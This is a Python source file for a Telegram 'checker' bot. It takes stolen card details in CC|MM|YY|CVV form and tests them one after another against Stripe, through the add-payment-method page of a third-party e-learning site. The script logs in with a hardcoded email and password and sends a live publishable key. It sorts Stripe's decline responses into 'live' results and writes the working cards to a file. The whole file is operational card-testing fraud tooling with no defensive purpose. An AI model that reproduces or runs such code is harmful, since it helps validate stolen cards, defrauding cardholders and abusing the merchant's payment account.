import os
import re
import time
import json
import asyncio
from html import unescape

import httpx
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ================= CONFIG ===================
OWNER_ADMIN_ID = 7519839885  # REPLACE WITH YOUR TELEGRAM USER ID (OWNER ADMIN)
ADMIN_ID_FILE = "admin_ids.txt"
# ============================================

def get_admin_chat_ids() -> set[int]:
    if os.path.exists(ADMIN_ID_FILE):
        with open(ADMIN_ID_FILE, "r") as f:
            ids = {int(line.strip()) for line in f if line.strip().isdigit()}
        return ids
    return set()

def save_admin_chat_ids(admins: set[int]) -> None:
    with open(ADMIN_ID_FILE, "w") as f:
        for aid in admins:
            f.write(f"{aid}\n")

admin_chat_ids = get_admin_chat_ids()

# HELPER FUNCTION TO EXTRACT SUBSTRING BETWEEN START AND END
def gets(s: str, start: str, end: str) -> str | None:
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

# CREATE PAYMENT METHOD WITH EXPIRY VALIDATION
async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
    try:
        cc, mes, ano, cvv = fullz.split("|")

        # VALIDATE EXPIRATION DATE
        mes = mes.zfill(2)
        if len(ano) == 4:
            ano = ano[-2:]

        current_year = int(time.strftime("%y"))
        current_month = int(time.strftime("%m"))

        try:
            expiry_month = int(mes)
            expiry_year = int(ano)
        except ValueError:
            return json.dumps({"error": {"message": "INVALID EXPIRY DATE"}})

        if expiry_month < 1 or expiry_month > 12:
            return json.dumps({"error": {"message": "EXPIRATION MONTH INVALID"}})
        if expiry_year < current_year:
            return json.dumps({"error": {"message": "EXPIRATION YEAR INVALID"}})
        if expiry_year == current_year and expiry_month < current_month:
            return json.dumps({"error": {"message": "EXPIRATION MONTH INVALID"}})

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/login/', headers=headers)

        login = gets(response.text, '"learndash-login-form" value="', '" />')

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/login/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        data = {
            'learndash-login-form': login,
            'pmpro_login_form_used': '1',
            'log': 'oliverjackson1209@gmail.com',
            'pwd': 'Oliverjack1209',
            'wp-submit': 'Log In',
            'redirect_to': '',
        }

        response = await session.post('https://elearntsg.com/wp-login.php', headers=headers, data=data)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/login/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/activity-feed/', headers=headers)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/activity-feed/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/my-account/payment-methods/', headers=headers)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/my-account/payment-methods/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/my-account/add-payment-method/', headers=headers)

        nonce = gets(response.text, '"add_card_nonce":"', '"')

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            'type':'card',
            'billing_details[name]':'oliver jackson',
            'billing_details[email]':'oliverjackson1209@gmail.com',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid':'70a2e756-b5bf-4236-9956-f42eeb07c5b8273a5f',
            'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
            'sid':'992dc1bf-9086-4997-865a-76988ba5154f55d68f',
            'payment_user_agent':'stripe.js/399197339e; stripe-js-v3/399197339e; split-card-element',
            'referrer':'https://elearntsg.com',
            'time_on_page':'116708',
            'client_attribution_metadata[client_session_id]':'36f62d63-5d9d-488b-beba-353f4cae2228',
            'client_attribution_metadata[merchant_integration_source]':'elements',
            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
            'client_attribution_metadata[merchant_integration_version]':'2017',
            'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
        }

        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        try:
            id = response.json()['id']
        except Exception:
            return response.text

        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': id,
            'nonce': nonce,
        }

        response = await session.post('https://elearntsg.com/', params=params, headers=headers, data=data)

        return response.text

    except Exception as e:
        return f"EXCEPTION: {str(e)}"

# FUNCTION MAPS API RESPONSE TEXT TO FRIENDLY MESSAGE
async def charge_resp(result):
    try:
        if (
            '{"status":"SUCCESS",' in result
            or '"status":"success"' in result
        ):
            response = "PAYMENT METHOD SUCCESSFULLY ADDED ✅"
        elif "Thank you for your donation" in result:
            response = "PAYMENT SUCCESSFUL! 🎉"
        elif "insufficient funds" in result or "card has insufficient funds." in result:
            response = "INSUFFICIENT FUNDS ✅"
        elif "Your card has insufficient funds." in result:
            response = "INSUFFICIENT FUNDS ✅"
        elif (
            "incorrect_cvc" in result
            or "security code is incorrect." in result
            or "Your card's security code is incorrect." in result
        ):
            response = "CVV INCORRECT ❎"
        elif "transaction_not_allowed" in result:
            response = "TRANSACTION NOT ALLOWED ❎"
        elif '"cvc_check": "pass"' in result:
            response = "CVV MATCH ✅"
        elif "requires_action" in result:
            response = "VERIFICATION 🚫"
        elif (
            "three_d_secure_redirect" in result
            or "card_error_authentication_required" in result
            or "wcpay-confirm-pi:" in result
        ):
            response = "3DS REQUIRED ❎"
        elif "stripe_3ds2_fingerprint" in result:
            response = "3DS REQUIRED ❎"
        elif "Your card does not support this type of purchase." in result:
            response = "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
        elif (
            "generic_decline" in result
            or "You have exceeded the maximum number of declines on this card in the last 24 hour period."
            in result
            or "card_decline_rate_limit_exceeded" in result
            or "This transaction cannot be processed." in result
            or '"status":400,' in result
        ):
            response = "GENERIC DECLINED ❌"
        elif "do not honor" in result:
            response = "DO NOT HONOR ❌"
        elif "Suspicious activity detected. Try again in a few minutes." in result:
            response = "TRY AGAIN IN A FEW MINUTES ❌"
        elif "fraudulent" in result:
            response = "FRAUDULENT ❌ "
        elif "setup_intent_authentication_failure" in result:
            response = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
        elif "invalid cvc" in result:
            response = "INVALID CVV ❌"
        elif "stolen card" in result:
            response = "STOLEN CARD ❌"
        elif "lost_card" in result:
            response = "LOST CARD ❌"
        elif "pickup_card" in result:
            response = "PICKUP CARD ❌"
        elif "incorrect_number" in result:
            response = "INCORRECT CARD NUMBER ❌"
        elif "Your card has expired." in result or "expired_card" in result:
            response = "EXPIRED CARD ❌"
        elif "intent_confirmation_challenge" in result:
            response = "CAPTCHA ❌"
        elif "Your card number is incorrect." in result:
            response = "INCORRECT CARD NUMBER ❌"
        elif (
            "Your card's expiration year is invalid." in result
            or "Your card's expiration year is invalid." in result
        ):
            response = "EXPIRATION YEAR INVALID ❌"
        elif (
            "Your card's expiration month is invalid." in result
            or "invalid_expiry_month" in result
        ):
            response = "EXPIRATION MONTH INVALID ❌"
        elif "card is not supported." in result:
            response = "CARD NOT SUPPORTED ❌"
        elif "invalid account" in result:
            response = "DEAD CARD ❌"
        elif (
            "Invalid API Key provided" in result
            or "testmode_charges_only" in result
            or "api_key_expired" in result
            or "Your account cannot currently make live charges." in result
        ):
            response = "STRIPE ERROR, CONTACT SUPPORT@STRIPE.COM FOR DETAILS ❌"
        elif "Your card was declined." in result or "card was declined" in result:
            response = "CARD DECLINED ❌"
        elif "card number is incorrect." in result:
            response = "CARD NUMBER INCORRECT ❌"
        elif "Sorry, we are unable to process your payment at this time. Please retry later." in result:
            response = "SORRY, PAYMENT CANNOT BE PROCESSED AT THIS TIME. PLEASE RETRY LATER ⏳"
        elif "card number is incomplete." in result:
            response = "CARD NUMBER INCOMPLETE ❌"
        elif "The order total is too high for this payment method" in result:
            response = "ORDER TOO HIGH FOR THIS CARD ❌"
        elif "The order total is too low for this payment method" in result:
            response = "ORDER TOO LOW FOR THIS CARD ❌"
        elif "Please Update Bearer Token" in result:
            response = "TOKEN EXPIRED, ADMIN HAS BEEN NOTIFIED ❌"
        else:
            response = result + "❌"
            with open("result_logs.txt", "a", encoding="utf-8") as f:
                f.write(f"{result}\n")

        return response
    except Exception as e:
        return f"{str(e)} ❌"

# COMBINES create_payment_method + charge_resp + MEASURE TIME
async def multi_checking(fullz: str) -> str:
    start = time.time()
    async with httpx.AsyncClient(timeout=40) as session:
        result = await create_payment_method(fullz, session)
        response = await charge_resp(result)

    elapsed = round(time.time() - start, 2)

    error_message = ""
    try:
        json_resp = json.loads(result)
        if "error" in json_resp:
            error_message = unescape(json_resp["error"].get("message", "")).strip()
    except Exception:
        pass

    if error_message:
        output = (
            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
        )
    else:
        output = (
            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
        )
        if any(key in response for key in ["PAYMENT METHOD SUCCESSFULLY ADDED", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
            with open("auth.txt", "a", encoding="utf-8") as file:
                file.write(output + "\n")

    return output

# TELEGRAM BOT HANDLERS

TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    global admin_chat_ids

    if not admin_chat_ids:
        if chat_id == OWNER_ADMIN_ID:
            admin_chat_ids.add(chat_id)
            save_admin_chat_ids(admin_chat_ids)
            await update.message.reply_text(
                f"𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗢𝗪𝗡𝗘𝗥 🤗\n"
                "SEND CARD IN FORMAT » CC|MM|YY|CVV\n"
            )
        else:
            await update.message.reply_text("BOT IS NOT CONFIGURED YET, ONLY OWNER ADMIN CAN REGISTER FIRST.")
        return

    if chat_id not in admin_chat_ids:
        await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        return

    await update.message.reply_text(
        "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
        "SEND CARD IN FORMAT » CC|MM|YY|CVV\n"
    )


async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    global admin_chat_ids

    if chat_id != OWNER_ADMIN_ID:
        await update.message.reply_text("ONLY OWNER ADMIN CAN ADD ANOTHER ADMIN. ❌")
        return

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("/addadmin USER ID")
        return

    try:
        new_admin_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
        return

    if new_admin_id in admin_chat_ids:
        await update.message.reply_text(f"USER ID {new_admin_id} IS ALREADY AN ADMIN.")
        return

    admin_chat_ids.add(new_admin_id)
    save_admin_chat_ids(admin_chat_ids)
    await update.message.reply_text(f"USER ID {new_admin_id} HAS BEEN SUCCESSFULLY ADDED AS ADMIN!")


async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    global admin_chat_ids

    if chat_id != OWNER_ADMIN_ID:
        await update.message.reply_text("ONLY OWNER ADMIN CAN REMOVE AN ADMIN. ❌")
        return

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("/deladmin USER ID")
        return

    try:
        remove_admin_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
        return

    if remove_admin_id not in admin_chat_ids:
        await update.message.reply_text(f"USER ID {remove_admin_id} IS NOT AN ADMIN.")
        return

    if remove_admin_id == OWNER_ADMIN_ID:
        await update.message.reply_text("YOU CANNOT REMOVE YOURSELF AS OWNER ADMIN. ❌")
        return

    admin_chat_ids.remove(remove_admin_id)
    save_admin_chat_ids(admin_chat_ids)
    await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMINS.")


async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.id not in admin_chat_ids:
        await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        return

    text = update.message.text.strip()

    # SPLIT INPUT CARD DATA BY LINES AND SPACES
    raw_cards = []
    for line in text.splitlines():
        for part in line.strip().split():
            if part:
                raw_cards.append(part.strip())

    if not raw_cards:
        await update.message.reply_text("NO CARD DATA FOUND IN MESSAGE.")
        return

    msg = await update.message.reply_text("PROCESSING YOUR CARD, PLEASE WAIT...", parse_mode='HTML')

    try:
        for fullz in raw_cards:
            parts = fullz.split("|")
            if len(parts) != 4:
                await update.message.reply_text(
                    f"WRONG FORMAT:\n<code>{fullz}</code>\nUSE FORMAT CC|MM|YYYY|CVV",
                    parse_mode='HTML'
                )
                continue

            cc_num, month, year, cvv = parts
            if len(year) == 4:
                year = year[-2:]

            cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"

            # OPTIONAL DELAY FOR RATE LIMITING - CAN DISABLE IF WANT FASTER
            await asyncio.sleep(3)

            result = await multi_checking(cc_formatted)
            await update.message.reply_text(result, parse_mode='HTML')

        await msg.delete()

    except Exception as e:
        await update.message.reply_text(f"ERROR: {str(e)}")


def main() -> None:
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("addadmin", addadmin))
    application.add_handler(CommandHandler("deladmin", deladmin))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))

    print("PARAEL CHECKER BOT RUNNING...")
    application.run_polling()


if __name__ == "__main__":
    main()
